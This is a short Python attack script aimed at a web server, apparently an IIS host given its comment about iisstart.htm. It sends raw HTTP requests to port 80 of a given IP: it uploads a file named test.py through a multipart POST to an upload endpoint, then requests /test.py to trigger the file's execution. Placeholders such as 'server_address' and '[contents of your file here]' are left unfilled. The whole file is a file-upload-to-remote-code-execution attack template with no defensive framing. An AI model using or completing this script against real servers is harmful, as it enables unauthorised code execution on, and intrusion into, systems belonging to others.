import socket
import sys

if len(sys.argv) <= 1:
    sys.exit('Give me an IP')

Host = sys.argv[1]

def SendPayload(Payload, Host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((Host, 80))
    s.send(Payload.encode())
    s.recv(1024)
    s.close()

# Make sure iisstart.htm exists.
Init = "GET / HTTP/1.0\r\n\r\n"

# Modify the payload to upload a file (POST request).
Payload = """POST /upload_endpoint HTTP/1.1\r\nHost: server_address\r\nContent-Type: multipart/form-data; boundary=your_boundary\r\n\r\n--your_boundary\r\nContent-Disposition: form-data; name="file"; filename="test.py"\r\nContent-Type: application/octet-stream\r\n\r\n[contents of your file here]\r\n--your_boundary--\r\n"""

# Replace "server_address" and "[contents of your file here]" with appropriate values.

SendPayload(Init, Host)
SendPayload(Payload, Host)

# Define the endpoint to execute the Python script
execution_endpoint = "/test.py"

# Create an HTTP GET request to trigger the execution
execution_request = f"GET {execution_endpoint} HTTP/1.1\r\nHost: {Host}\r\n\r\n"

# Send the execution request to the server
SendPayload(execution_request, Host)
